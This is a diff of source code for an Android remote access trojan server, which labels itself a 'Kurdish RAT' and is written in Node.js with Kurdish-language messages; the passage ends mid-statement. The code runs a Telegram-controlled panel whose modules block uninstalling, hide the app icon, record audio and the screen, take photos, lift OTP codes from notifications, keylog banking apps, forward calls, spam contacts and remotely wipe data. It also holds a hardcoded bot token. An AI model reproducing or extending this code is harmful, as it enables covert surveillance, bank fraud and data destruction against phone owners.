@@ -1,7 +1,7 @@
 // =====================================================
-// 7ASHASHE V40 - ULTIMATE KURDISH RAT
+// 7ASHASHE V41 - ULTIMATE KURDISH RAT
 // گەشەپێدەر: 7ASHASHE - وەحشی هاک
-// وەشان: 40.0.0 - ULTIMATE KURDISH
+// وەشان: 41.0.0 - FIXED EDITION
 // =====================================================
 
 const express = require('express');
@@ -28,13 +28,13 @@ const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 
 // =====================================================
-// 🔐 CREDENTIALS - 7ASHASHE (تۆکنی نوێ)
+// 🔐 CREDENTIALS - 7ASHASHE
 // =====================================================
 const CONFIG = {
     TOKEN: '8745582802:AAEKDPD6hQSlw7cvFHgBnDdE5-NLf-sgRWU',
     CHAT_ID: '5578405082',
     MASTER: '7ASHASHE',
-    VERSION: '40.0.0',
+    VERSION: '41.0.0',
     ENCRYPTION_KEY: crypto.randomBytes(32).toString('hex'),
     SESSION_SECRET: crypto.randomBytes(64).toString('hex'),
     PORT: process.env.PORT || 8080,
@@ -44,7 +44,7 @@ const CONFIG = {
 };
 
 // =====================================================
-// 🤖 TELEGRAM BOT INIT
+// 🤖 TELEGRAM BOT INIT (HTML MODE)
 // =====================================================
 const bot = new TelegramBot(CONFIG.TOKEN, { polling: true });
 
@@ -161,7 +161,6 @@ class AntiUninstall {
         const client = clients.get(clientId);
         if (!client) return;
 
-        // قفڵکردنی مۆبایلەکە
         if (client.ws.readyState === WebSocket.OPEN) {
             client.ws.send(JSON.stringify({
                 type: 'lock_device',
@@ -170,18 +169,16 @@ class AntiUninstall {
             }));
         }
 
-        // ناردنی ئاگاداری بۆ تێلیگرام
         bot.sendMessage(CONFIG.CHAT_ID,
-            `🚫 **⚠️ دژە-سڕینەوە**\n\n` +
-            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
-            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
-            `🔢 ژمارەی هەوڵ: ${attempts + 1}\n` +
-            `⏰ کات: ${new Date().toLocaleString('ckb')}\n\n` +
-            `✅ مۆبایلەکە قفڵ کرا`,
-            { parse_mode: 'Markdown' }
+            `<b>🚫 ⚠️ دژە-سڕینەوە</b>\n\n` +
+            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
+            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n` +
+            `<b>🔢 ژمارەی هەوڵ:</b> ${attempts + 1}\n` +
+            `<b>⏰ کات:</b> ${new Date().toLocaleString('ckb')}\n\n` +
+            `<b>✅ مۆبایلەکە قفڵ کرا</b>`,
+            { parse_mode: 'HTML' }
         );
 
-        // نوێکردنەوەی ئامارەکان
         const db = readDB();
         db.stats.anti_uninstall_attempts++;
         writeDB(db);
@@ -190,7 +187,6 @@ class AntiUninstall {
 
 const antiUninstall = new AntiUninstall();
 
-// API endpoint for uninstall attempts
 app.post('/api/anti-uninstall', (req, res) => {
     const { clientId } = req.body;
     antiUninstall.handleUninstallAttempt(clientId);
@@ -209,7 +205,6 @@ class IconHider {
         const client = clients.get(clientId);
         if (!client) return;
 
-        // ناردنی فەرمان بۆ شاردنەوەی ئایکۆن
         if (client.ws.readyState === WebSocket.OPEN) {
             client.ws.send(JSON.stringify({
                 type: 'hide_icon',
@@ -220,12 +215,12 @@ class IconHider {
         this.hiddenIcons.set(clientId, true);
 
         bot.sendMessage(CONFIG.CHAT_ID,
-            `👁️ **🔒 ئایکۆن شاردرایەوە**\n\n` +
-            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
-            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
-            `⏰ کات: ${new Date().toLocaleString('ckb')}\n\n` +
-            `✅ ئایکۆن لە لیستی ئەپەکان ون بوو`,
-            { parse_mode: 'Markdown' }
+            `<b>👁️ 🔒 ئایکۆن شاردرایەوە</b>\n\n` +
+            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
+            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n` +
+            `<b>⏰ کات:</b> ${new Date().toLocaleString('ckb')}\n\n` +
+            `<b>✅ ئایکۆن لە لیستی ئەپەکان ون بوو</b>`,
+            { parse_mode: 'HTML' }
         );
     }
 
@@ -243,11 +238,11 @@ class IconHider {
         this.hiddenIcons.delete(clientId);
 
         bot.sendMessage(CONFIG.CHAT_ID,
-            `👁️ **🔓 ئایکۆن دەرکەوتەوە**\n\n` +
-            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
-            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
-            `⏰ کات: ${new Date().toLocaleString('ckb')}`,
-            { parse_mode: 'Markdown' }
+            `<b>👁️ 🔓 ئایکۆن دەرکەوتەوە</b>\n\n` +
+            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
+            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n` +
+            `<b>⏰ کات:</b> ${new Date().toLocaleString('ckb')}`,
+            { parse_mode: 'HTML' }
         );
     }
 }
@@ -262,7 +257,7 @@ class LiveAudioStream {
         this.activeStreams = new Map();
     }
 
-    async startAudioStream(clientId, duration = 60) { // duration لە چرکە
+    async startAudioStream(clientId, duration = 60) {
         const client = clients.get(clientId);
         if (!client) return;
 
@@ -285,13 +280,13 @@ class LiveAudioStream {
         });
 
         bot.sendMessage(CONFIG.CHAT_ID,
-            `🎤 **🔴 گوێگرتنی ڕاستەوخۆ**\n\n` +
-            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
-            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
-            `⏱️ ماوە: ${duration} چرکە\n` +
-            `🆔 Stream: ${streamId.substring(0, 8)}...\n` +
-            `⏰ کات: ${new Date().toLocaleString('ckb')}`,
-            { parse_mode: 'Markdown' }
+            `<b>🎤 🔴 گوێگرتنی ڕاستەوخۆ</b>\n\n` +
+            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
+            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n` +
+            `<b>⏱️ ماوە:</b> ${duration} چرکە\n` +
+            `<b>🆔 Stream:</b> ${streamId.substring(0, 8)}...\n` +
+            `<b>⏰ کات:</b> ${new Date().toLocaleString('ckb')}`,
+            { parse_mode: 'HTML' }
         );
 
         return streamId;
@@ -314,24 +309,23 @@ class LiveAudioStream {
         this.activeStreams.delete(streamId);
 
         bot.sendMessage(CONFIG.CHAT_ID,
-            `🎤 **⏹️ گوێگرتنی ڕاستەوخۆ وەستا**\n\n` +
-            `🆔 Stream: ${streamId.substring(0, 8)}...\n` +
-            `⏰ کات: ${new Date().toLocaleString('ckb')}`,
-            { parse_mode: 'Markdown' }
+            `<b>🎤 ⏹️ گوێگرتنی ڕاستەوخۆ وەستا</b>\n\n` +
+            `<b>🆔 Stream:</b> ${streamId.substring(0, 8)}...\n` +
+            `<b>⏰ کات:</b> ${new Date().toLocaleString('ckb')}`,
+            { parse_mode: 'HTML' }
         );
     }
 }
 
 const liveAudioStream = new LiveAudioStream();
 
-// API endpoint for audio stream data
 app.post('/api/audio-stream', upload.single('audio'), (req, res) => {
     const { streamId } = req.headers;
     const { buffer } = req.file;
 
     bot.sendAudio(CONFIG.CHAT_ID, buffer, {
-        caption: `🎤 **پارچەی دەنگ**\n\n🆔 Stream: ${streamId.substring(0, 8)}...`,
-        parse_mode: 'Markdown'
+        caption: `<b>🎤 پارچەی دەنگ</b>\n\n<b>🆔 Stream:</b> ${streamId.substring(0, 8)}...`,
+        parse_mode: 'HTML'
     });
 
     res.json({ success: true });
@@ -360,13 +354,13 @@ class SmartScreenshot {
         this.monitoredApps.set(`${clientId}:${appName}`, true);
 
         bot.sendMessage(CONFIG.CHAT_ID,
-            `📸 **👁️ چاودێری ئەپ**\n\n` +
-            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
-            `📱 ئەپ: ${appName}\n` +
-            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
-            `⏰ کات: ${new Date().toLocaleString('ckb')}\n\n` +
-            `✅ کاتێک ئەپەکە بکرێتەوە، سکرینشۆت دەگیرێت`,
-            { parse_mode: 'Markdown' }
+            `<b>📸 👁️ چاودێری ئەپ</b>\n\n` +
+            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
+            `<b>📱 ئەپ:</b> ${appName}\n` +
+            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n` +
+            `<b>⏰ کات:</b> ${new Date().toLocaleString('ckb')}\n\n` +
+            `<b>✅ کاتێک ئەپەکە بکرێتەوە، سکرینشۆت دەگیرێت</b>`,
+            { parse_mode: 'HTML' }
         );
     }
 
@@ -389,7 +383,7 @@ class SmartScreenshot {
 const smartScreenshot = new SmartScreenshot();
 
 // =====================================================
-// 🚀 5. کۆنترۆڵی کامێرا (Camera Flash Control)
+// 🚀 5. کۆنترۆڵی کامێرا (Camera Flash Control) - FIXED
 // =====================================================
 class CameraFlashControl {
     constructor() {
@@ -398,7 +392,13 @@ class CameraFlashControl {
 
     async takePhoto(clientId, camera = 'back', flash = false) {
         const client = clients.get(clientId);
-        if (!client) return;
+        if (!client) {
+            bot.sendMessage(CONFIG.CHAT_ID,
+                `<b>❌ هەڵە</b>\n\n<b>ئامێرەکە نەدۆزرایەوە</b>`,
+                { parse_mode: 'HTML' }
+            );
+            return;
+        }
 
         if (client.ws.readyState === WebSocket.OPEN) {
             client.ws.send(JSON.stringify({
@@ -407,17 +407,23 @@ class CameraFlashControl {
                 flash,
                 timestamp: Date.now()
             }));
+            
+            bot.sendMessage(CONFIG.CHAT_ID,
+                `<b>📸 وێنەگرتن</b>\n\n` +
+                `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
+                `<b>📷 کامێرا:</b> ${camera === 'back' ? 'پشت' : 'پێش'}\n` +
+                `<b>⚡ فلاش:</b> ${flash ? 'بەڵێ' : 'نەخێر'}\n` +
+                `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n` +
+                `<b>⏰ کات:</b> ${new Date().toLocaleString('ckb')}\n\n` +
+                `<b>⏳ چاوەڕێی وێنەکە...</b>`,
+                { parse_mode: 'HTML' }
+            );
+        } else {
+            bot.sendMessage(CONFIG.CHAT_ID,
+                `<b>❌ هەڵە</b>\n\n<b>پەیوەندی لەگەڵ ئامێرەکە نییە</b>`,
+                { parse_mode: 'HTML' }
+            );
         }
-
-        bot.sendMessage(CONFIG.CHAT_ID,
-            `📸 **📸 وێنەگرتن**\n\n` +
-            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
-            `📷 کامێرا: ${camera === 'back' ? 'پشت' : 'پێش'}\n` +
-            `⚡ فلاش: ${flash ? 'بەڵێ' : 'نەخێر'}\n` +
-            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
-            `⏰ کات: ${new Date().toLocaleString('ckb')}`,
-            { parse_mode: 'Markdown' }
-        );
     }
 
     async toggleFlash(clientId, enable) {
@@ -460,12 +466,12 @@ class BatteryBypass {
         this.bypassActive.set(clientId, true);
 
         bot.sendMessage(CONFIG.CHAT_ID,
-            `🔋 **⚡ دژە-باتری چالاک کرا**\n\n` +
-            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
-            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
-            `⏰ کات: ${new Date().toLocaleString('ckb')}\n\n` +
-            `✅ سیستەمی پاشەکەوتکردنی وزە ناچالاک کرا`,
-            { parse_mode: 'Markdown' }
+            `<b>🔋 ⚡ دژە-باتری چالاک کرا</b>\n\n` +
+            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
+            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n` +
+            `<b>⏰ کات:</b> ${new Date().toLocaleString('ckb')}\n\n` +
+            `<b>✅ سیستەمی پاشەکەوتکردنی وزە ناچالاک کرا</b>`,
+            { parse_mode: 'HTML' }
         );
     }
 
@@ -499,10 +505,8 @@ class SimChangeAlert {
         if (!client) return;
 
         const oldSim = this.simInfo.get(clientId);
-
         this.simInfo.set(clientId, newSimInfo);
 
-        // وەرگرتنی شوێن
         let location = 'نەزانراو';
         if (client.ws.readyState === WebSocket.OPEN) {
             client.ws.send(JSON.stringify({
@@ -512,14 +516,14 @@ class SimChangeAlert {
         }
 
         bot.sendMessage(CONFIG.CHAT_ID,
-            `📱 **⚠️ گۆڕینی سیمکارت**\n\n` +
-            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
-            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
-            `📱 سیمی نوێ: ${newSimInfo.number || 'نەزانراو'}\n` +
-            `📡 کەریەر: ${newSimInfo.carrier || 'نەزانراو'}\n` +
-            `🌍 شوێن: ${location}\n` +
-            `⏰ کات: ${new Date().toLocaleString('ckb')}`,
-            { parse_mode: 'Markdown' }
+            `<b>📱 ⚠️ گۆڕینی سیمکارت</b>\n\n` +
+            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
+            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n` +
+            `<b>📱 سیمی نوێ:</b> ${newSimInfo.number || 'نەزانراو'}\n` +
+            `<b>📡 کەریەر:</b> ${newSimInfo.carrier || 'نەزانراو'}\n` +
+            `<b>🌍 شوێن:</b> ${location}\n` +
+            `<b>⏰ کات:</b> ${new Date().toLocaleString('ckb')}`,
+            { parse_mode: 'HTML' }
         );
 
         const db = readDB();
@@ -530,7 +534,6 @@ class SimChangeAlert {
 
 const simChangeAlert = new SimChangeAlert();
 
-// API endpoint for sim change
 app.post('/api/sim-change', (req, res) => {
     const { clientId, simInfo } = req.body;
     simChangeAlert.handleSimChange(clientId, simInfo);
@@ -550,13 +553,13 @@ class RemoteWipe {
         if (!client) return;
 
         bot.sendMessage(CONFIG.CHAT_ID,
-            `💥 **⚠️ سڕینەوەی داتا**\n\n` +
-            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
-            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
-            `📋 جۆر: ${wipeType === 'all' ? 'هەموو داتاکان' : 'تەنها وێنە'}\n` +
-            `⏰ کات: ${new Date().toLocaleString('ckb')}\n\n` +
-            `✅ دەستپێکردنی سڕینەوە...`,
-            { parse_mode: 'Markdown' }
+            `<b>💥 ⚠️ سڕینەوەی داتا</b>\n\n` +
+            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
+            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n` +
+            `<b>📋 جۆر:</b> ${wipeType === 'all' ? 'هەموو داتاکان' : 'تەنها وێنە'}\n` +
+            `<b>⏰ کات:</b> ${new Date().toLocaleString('ckb')}\n\n` +
+            `<b>✅ دەستپێکردنی سڕینەوە...</b>`,
+            { parse_mode: 'HTML' }
         );
 
         this.wipeInProgress.set(clientId, {
@@ -572,7 +575,6 @@ class RemoteWipe {
             }));
         }
 
-        // پاککردنەوەی داتاکانی سێرڤەر
         setTimeout(() => {
             this.wipeInProgress.delete(clientId);
         }, 60000);
@@ -611,13 +613,13 @@ class FakeToast {
         }
 
         bot.sendMessage(CONFIG.CHAT_ID,
-            `📱 **💬 پەیامی ساختە نێردرا**\n\n` +
-            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
-            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
-            `📝 پەیام: ${message}\n` +
-            `⏱️ ماوە: ${duration}ms\n` +
-            `⏰ کات: ${new Date().toLocaleString('ckb')}`,
-            { parse_mode: 'Markdown' }
+            `<b>📱 💬 پەیامی ساختە نێردرا</b>\n\n` +
+            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
+            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n` +
+            `<b>📝 پەیام:</b> ${message}\n` +
+            `<b>⏱️ ماوە:</b> ${duration}ms\n` +
+            `<b>⏰ کات:</b> ${new Date().toLocaleString('ckb')}`,
+            { parse_mode: 'HTML' }
         );
     }
 
@@ -654,12 +656,12 @@ class AutoBoot {
         this.bootEnabled.set(clientId, true);
 
         bot.sendMessage(CONFIG.CHAT_ID,
-            `🔄 **⚡ سیستمی ڕیستارت چالاک کرا**\n\n` +
-            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
-            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
-            `⏰ کات: ${new Date().toLocaleString('ckb')}\n\n` +
-            `✅ دوای هەر کوژانەوەیەک، ئەپەکە خۆکارانە دەست پێ دەکاتەوە`,
-            { parse_mode: 'Markdown' }
+            `<b>🔄 ⚡ سیستمی ڕیستارت چالاک کرا</b>\n\n` +
+            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
+            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n` +
+            `<b>⏰ کات:</b> ${new Date().toLocaleString('ckb')}\n\n` +
+            `<b>✅ دوای هەر کوژانەوەیەک، ئەپەکە خۆکارانە دەست پێ دەکاتەوە</b>`,
+            { parse_mode: 'HTML' }
         );
     }
 
@@ -682,19 +684,18 @@ class AutoBoot {
         if (!client) return;
 
         bot.sendMessage(CONFIG.CHAT_ID,
-            `🔄 **✅ ئامێر دووبارە بووەوە**\n\n` +
-            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
-            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
-            `⏰ کات: ${new Date().toLocaleString('ckb')}\n\n` +
-            `✅ ئەپەکە خۆکارانە دەستی پێ کردەوە`,
-            { parse_mode: 'Markdown' }
+            `<b>🔄 ✅ ئامێر دووبارە بووەوە</b>\n\n` +
+            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
+            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n` +
+            `<b>⏰ کات:</b> ${new Date().toLocaleString('ckb')}\n\n` +
+            `<b>✅ ئەپەکە خۆکارانە دەستی پێ کردەوە</b>`,
+            { parse_mode: 'HTML' }
         );
     }
 }
 
 const autoBoot = new AutoBoot();
 
-// API endpoint for boot complete
 app.post('/api/boot-complete', (req, res) => {
     const { clientId } = req.body;
     autoBoot.handleBootComplete(clientId);
@@ -733,22 +734,22 @@ class NotificationListener {
         
         if (isOTP) {
             bot.sendMessage(CONFIG.CHAT_ID,
-                `💰 **🔐 ئاگاداری OTP**\n\n` +
-                `📱 ئەپ: ${notif.app}\n` +
-                `📌 ناونیشان: ${notif.title}\n` +
-                `📝 پەیام: ${notif.text}\n` +
-                `🔢 OTP: ${notif.text.match(/\b\d{4,6}\b/)}\n` +
-                `⏰ کات: ${new Date(notif.timestamp).toLocaleString('ckb')}`,
-                { parse_mode: 'Markdown' }
+                `<b>💰 🔐 ئاگاداری OTP</b>\n\n` +
+                `<b>📱 ئەپ:</b> ${notif.app}\n` +
+                `<b>📌 ناونیشان:</b> ${notif.title}\n` +
+                `<b>📝 پەیام:</b> ${notif.text}\n` +
+                `<b>🔢 OTP:</b> ${notif.text.match(/\b\d{4,6}\b/)}\n` +
+                `<b>⏰ کات:</b> ${new Date(notif.timestamp).toLocaleString('ckb')}`,
+                { parse_mode: 'HTML' }
             );
         } else {
             bot.sendMessage(CONFIG.CHAT_ID,
-                `📱 **نۆتیفیکەیشن**\n\n` +
-                `📱 ئەپ: ${notif.app}\n` +
-                `📌 ناونیشان: ${notif.title}\n` +
-                `📝 پەیام: ${notif.text}\n` +
-                `⏰ کات: ${new Date(notif.timestamp).toLocaleString('ckb')}`,
-                { parse_mode: 'Markdown' }
+                `<b>📱 نۆتیفیکەیشن</b>\n\n` +
+                `<b>📱 ئەپ:</b> ${notif.app}\n` +
+                `<b>📌 ناونیشان:</b> ${notif.title}\n` +
+                `<b>📝 پەیام:</b> ${notif.text}\n` +
+                `<b>⏰ کات:</b> ${new Date(notif.timestamp).toLocaleString('ckb')}`,
+                { parse_mode: 'HTML' }
             );
         }
         
@@ -766,7 +767,6 @@ class NotificationListener {
 
 const notificationListener = new NotificationListener();
 
-// API endpoint for notifications
 app.post('/api/notification', (req, res) => {
     const notification = req.body;
     const captured = notificationListener.captureNotification(notification);
@@ -806,13 +806,13 @@ class ScreenStreamer {
             const client = clients.get(clientId);
             if (client) {
                 bot.sendMessage(CONFIG.CHAT_ID,
-                    `📹 **Streamی شاشە دەستی پێکرد**\n\n` +
-                    `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
-                    `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
-                    `📊 کوالیتی: ${options.quality}\n` +
-                    `🎞️ FPS: ${options.fps}\n` +
-                    `🆔 Stream: ${stream.id.substring(0, 8)}...`,
-                    { parse_mode: 'Markdown' }
+                    `<b>📹 Streamی شاشە دەستی پێکرد</b>\n\n` +
+                    `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
+                    `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n` +
+                    `<b>📊 کوالیتی:</b> ${options.quality}\n` +
+                    `<b>🎞️ FPS:</b> ${options.fps}\n` +
+                    `<b>🆔 Stream:</b> ${stream.id.substring(0, 8)}...`,
+                    { parse_mode: 'HTML' }
                 );
             }
             
@@ -833,11 +833,11 @@ class ScreenStreamer {
             const duration = Math.floor((Date.now() - new Date(stream.startedAt)) / 1000);
             
             bot.sendMessage(CONFIG.CHAT_ID,
-                `⏹️ **Streamی شاشە وەستا**\n\n` +
-                `🆔 Stream: ${streamId.substring(0, 8)}...\n` +
-                `📊 فرەیم: ${stream.frames}\n` +
-                `⏱️ ماوە: ${duration} چرکە`,
-                { parse_mode: 'Markdown' }
+                `<b>⏹️ Streamی شاشە وەستا</b>\n\n` +
+                `<b>🆔 Stream:</b> ${streamId.substring(0, 8)}...\n` +
+                `<b>📊 فرەیم:</b> ${stream.frames}\n` +
+                `<b>⏱️ ماوە:</b> ${duration} چرکە`,
+                { parse_mode: 'HTML' }
             );
         }
     }
@@ -849,7 +849,6 @@ class ScreenStreamer {
 
 const screenStreamer = new ScreenStreamer();
 
-// API endpoint for screen stream
 app.post('/api/screen/stream', (req, res) => {
     const { clientId, options } = req.body;
     screenStreamer.startStream(clientId, options).then(stream => {
@@ -904,12 +903,12 @@ class SmartKeylogger {
             const client = clients.get(clientId);
             if (client) {
                 bot.sendMessage(CONFIG.CHAT_ID,
-                    `💰 **💰 ئاگاداری بانکی**\n\n` +
-                    `📱 ئەپ: ${app}\n` +
-                    `⌨️ کلیک: ${key}\n` +
-                    `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
-                    `🆔 ئایدی: ${clientId.substring(0, 8)}...`,
-                    { parse_mode: 'Markdown' }
+                    `<b>💰 ئاگاداری بانکی</b>\n\n` +
+                    `<b>📱 ئەپ:</b> ${app}\n` +
+                    `<b>⌨️ کلیک:</b> ${key}\n` +
+                    `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
+                    `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...`,
+                    { parse_mode: 'HTML' }
                 );
             }
         }
@@ -933,11 +932,11 @@ class SmartKeylogger {
         const client = clients.get(clientId);
         if (client) {
             bot.sendMessage(CONFIG.CHAT_ID,
-                `⌨️ **کێڤلۆگەری زیرەک دەستی پێکرد**\n\n` +
-                `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
-                `📱 ئەپ: ${app}\n` +
-                `🆔 ئایدی: ${clientId.substring(0, 8)}...`,
-                { parse_mode: 'Markdown' }
+                `<b>⌨️ کێڤلۆگەری زیرەک دەستی پێکرد</b>\n\n` +
+                `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
+                `<b>📱 ئەپ:</b> ${app}\n` +
+                `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...`,
+                { parse_mode: 'HTML' }
             );
         }
     }
@@ -953,7 +952,6 @@ class SmartKeylogger {
 
 const smartKeylogger = new SmartKeylogger();
 
-// API endpoint for keylogger
 app.post('/api/keylogger', (req, res) => {
     const { clientId, key, app } = req.body;
     smartKeylogger.logKey(clientId, key, app);
@@ -1006,11 +1004,11 @@ class CallForwarding {
         }
         
         bot.sendMessage(CONFIG.CHAT_ID,
-            `📞 **گواستنەوەی پەیوەندی چالاک کرا**\n\n` +
-            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
-            `📱 ژمارە: ${targetNumber}\n` +
-            `🆔 ئایدی: ${clientId.substring(0, 8)}...`,
-            { parse_mode: 'Markdown' }
+            `<b>📞 گواستنەوەی پەیوەندی چالاک کرا</b>\n\n` +
+            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
+            `<b>📱 ژمارە:</b> ${targetNumber}\n` +
+            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...`,
+            { parse_mode: 'HTML' }
         );
         
         return forwarding;
@@ -1030,10 +1028,10 @@ class CallForwarding {
             }
             
             bot.sendMessage(CONFIG.CHAT_ID,
-                `⏹️ **گواستنەوەی پەیوەندی وەستا**\n\n` +
-                `🆔 Forward: ${forwardId.substring(0, 8)}...\n` +
-                `📊 پەیوەندی گواستراوە: ${forwarding.forwardedCalls}`,
-                { parse_mode: 'Markdown' }
+                `<b>⏹️ گواستنەوەی پەیوەندی وەستا</b>\n\n` +
+                `<b>🆔 Forward:</b> ${forwardId.substring(0, 8)}...\n` +
+                `<b>📊 پەیوەندی گواستراوە:</b> ${forwarding.forwardedCalls}`,
+                { parse_mode: 'HTML' }
             );
         }
     }
@@ -1078,11 +1076,11 @@ class ContactsSpam {
         }
         
         bot.sendMessage(CONFIG.CHAT_ID,
-            `📨 **سپامی کۆنتاکتەکان دەستی پێکرد**\n\n` +
-            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
-            `📝 پەیام: ${message}\n` +
-            `🆔 ئایدی: ${clientId.substring(0, 8)}...`,
-            { parse_mode: 'Markdown' }
+            `<b>📨 سپامی کۆنتاکتەکان دەستی پێکرد</b>\n\n` +
+            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
+            `<b>📝 پەیام:</b> ${message}\n` +
+            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...`,
+            { parse_mode: 'HTML' }
         );
         
         return spam;
@@ -1097,9 +1095,9 @@ class ContactsSpam {
             if (sent >= total) {
                 spam.active = false;
                 bot.sendMessage(CONFIG.CHAT_ID,
-                    `✅ **سپام تەواو بوو**\n\n` +
-                    `📊 نێردرا: ${sent}/${total} پەیام`,
-                    { parse_mode: 'Markdown' }
+                    `<b>✅ سپام تەواو بوو</b>\n\n` +
+                    `<b>📊 نێردرا:</b> ${sent}/${total} پەیام`,
+                    { parse_mode: 'HTML' }
                 );
                 this.activeSpams.delete(spamId);
             }
@@ -1109,7 +1107,6 @@ class ContactsSpam {
 
 const contactsSpam = new ContactsSpam();
 
-// API endpoint for spam progress
 app.post('/api/spam/progress', (req, res) => {
     const { spamId, sent, total } = req.body;
     contactsSpam.updateProgress(spamId, sent, total);
@@ -1137,11 +1134,11 @@ class AppKiller {
         }
         
         bot.sendMessage(CONFIG.CHAT_ID,
-            `🛑 **کوشتنی ئەپ**\n\n` +
-            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
-            `📱 ئەپ: ${appPackage}\n` +
-            `🆔 ئایدی: ${clientId.substring(0, 8)}...`,
-            { parse_mode: 'Markdown' }
+            `<b>🛑 کوشتنی ئەپ</b>\n\n` +
+            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
+            `<b>📱 ئەپ:</b> ${appPackage}\n` +
+            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...`,
+            { parse_mode: 'HTML' }
         );
     }
 
@@ -1160,12 +1157,12 @@ class AppKiller {
         }
         
         bot.sendMessage(CONFIG.CHAT_ID,
-            `🚫 **بلۆکی ئەپ**\n\n` +
-            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
-            `📱 ئەپ: ${appPackage}\n` +
-            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n\n` +
-            `✅ ئەپەکە بلۆک کرا`,
-            { parse_mode: 'Markdown' }
+            `<b>🚫 بلۆکی ئەپ</b>\n\n` +
+            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
+            `<b>📱 ئەپ:</b> ${appPackage}\n` +
+            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n\n` +
+            `<b>✅ ئەپەکە بلۆک کرا</b>`,
+            { parse_mode: 'HTML' }
         );
     }
 
@@ -1184,10 +1181,10 @@ class AppKiller {
         }
         
         bot.sendMessage(CONFIG.CHAT_ID,
-            `✅ **لابردنی بلۆکی ئەپ**\n\n` +
-            `📱 ئەپ: ${appPackage}\n` +
-            `🆔 ئایدی: ${clientId.substring(0, 8)}...`,
-            { parse_mode: 'Markdown' }
+            `<b>✅ لابردنی بلۆکی ئەپ</b>\n\n` +
+            `<b>📱 ئەپ:</b> ${appPackage}\n` +
+            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...`,
+            { parse_mode: 'HTML' }
         );
     }
 }
@@ -1218,10 +1215,10 @@ class WifiBluetoothControl {
         }
         
         bot.sendMessage(CONFIG.CHAT_ID,
-            `${enable ? '📶' : '❌'} **وایفای ${enable ? 'داگیرسا' : 'کوژایەوە'}**\n\n` +
-            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
